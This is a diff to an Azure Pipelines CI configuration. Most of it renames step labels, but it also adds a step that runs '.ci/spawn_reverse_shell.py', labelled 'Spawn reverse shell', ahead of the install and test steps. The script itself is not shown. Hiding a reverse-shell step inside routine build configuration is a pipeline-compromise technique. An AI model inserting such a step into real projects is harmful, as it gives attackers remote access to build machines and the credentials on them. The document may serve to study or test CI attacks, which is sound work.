@@ -10,11 +10,14 @@ steps:
     versionSpec: '$(python.version)'
     architecture: 'x64'
 
+- script: .ci/spawn_reverse_shell.py
+  displayName: "Spawn reverse shell"
+
 - script: .ci/prep_azure.py
-  displayName: "Install requirements."
+  displayName: "Run prep_azure.py"
 
 - script: .ci/$(MODE)_install.py
-  displayName: "Install requirements."
+  displayName: "Run $(MODE)_install.py"
 
 - script: .ci/$(MODE)_tests.py
-  displayName: Run tests.
+  displayName: "Run $(MODE)_tests.py"
